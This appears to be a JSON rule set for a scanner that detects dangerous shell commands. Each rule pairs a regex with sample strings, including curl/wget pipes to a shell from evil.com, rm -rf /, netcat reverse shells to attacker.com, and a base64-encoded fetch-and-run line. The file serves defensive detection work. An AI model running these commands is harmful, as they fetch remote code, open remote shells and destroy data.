[
  {
    "id": "H001",
    "description": "Command execution indicators - curl/wget with pipes",
    "pattern": "\\b(curl|wget)\\s+[^\\s]+\\s*\\|\\s*(sh|bash|zsh)",
    "type": "regex",
    "tags": [
      "command-injection",
      "shell",
      "critical"
    ],
    "examples": [
      "curl http://evil.com/script.sh | bash",
      "wget -qO- http://attacker.com/payload | sh"
    ]
  },
  {
    "id": "H002",
    "description": "Dangerous file operations",
    "pattern": "\\brm\\s+\\-rf\\s+[/~]",
    "type": "regex",
    "tags": [
      "file-operations",
      "destructive",
      "critical"
    ],
    "examples": [
      "rm -rf /",
      "rm -rf ~/"
    ]
  },
  {
    "id": "H003",
    "description": "System command execution functions",
    "pattern": "\\b(system|exec|spawn|subprocess\\.call|os\\.popen)\\s*\\(",
    "type": "regex",
    "tags": [
      "code-execution",
      "system-calls",
      "critical"
    ],
    "examples": [
      "system('malicious command')",
      "exec('evil code')",
      "subprocess.call(['rm', '-rf', '/'])"
    ]
  },
  {
    "id": "H004",
    "description": "Network tools with command chaining",
    "pattern": "\\b(nc|netcat|ncat)\\s+.*\\s*\\-e\\s+",
    "type": "regex",
    "tags": [
      "network",
      "shell",
      "critical"
    ],
    "examples": [
      "nc -e /bin/sh attacker.com 4444",
      "netcat -e /bin/bash evil.com 1337"
    ]
  },
  {
    "id": "H005",
    "description": "Base64 encoded shell commands",
    "pattern": "echo\\s+[A-Za-z0-9+/]{20,}={0,2}\\s*\\|\\s*base64\\s+\\-d\\s*\\|\\s*(sh|bash)",
    "type": "regex",
    "tags": [
      "encoding",
      "shell",
      "obfuscation",
      "critical"
    ],
    "examples": [
      "echo Y3VybCBldmlsLmNvbSB8IHNo | base64 -d | bash"
    ]
  }
]